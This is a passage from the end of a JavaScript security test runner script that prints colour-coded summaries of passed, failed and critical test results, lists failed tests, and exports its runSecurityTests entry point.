    log("\n🚨 CRITICAL SECURITY ISSUES FOUND!", "red");
    log("These must be addressed immediately.", "red");
  }

  if (testResults.failed === 0) {
    log("\n✅ All security tests passed!", "green");
  } else if (testResults.critical === 0) {
    log("\n⚠️  Some tests failed but no critical issues found.", "yellow");
  }

  // Detailed results
  if (testResults.failed > 0) {
    log("\n📋 FAILED TESTS:", "bold");
    testResults.details
      .filter((t) => t.status === "FAIL")
      .forEach((test) => {
        const severity = test.severity === "critical" ? " 🔥 CRITICAL" : "";
        log(`  ❌ ${test.testName}${severity}`, "red");
      });
  }

  log(`\nCompleted at: ${new Date().toISOString()}`, "blue");
}

// Run the tests
if (import.meta.url === `file://${process.argv[1]}`) {
  runSecurityTests().catch((error) => {
    console.error("Failed to run security tests:", error);
    process.exit(1);
  });
}

export { runSecurityTests };
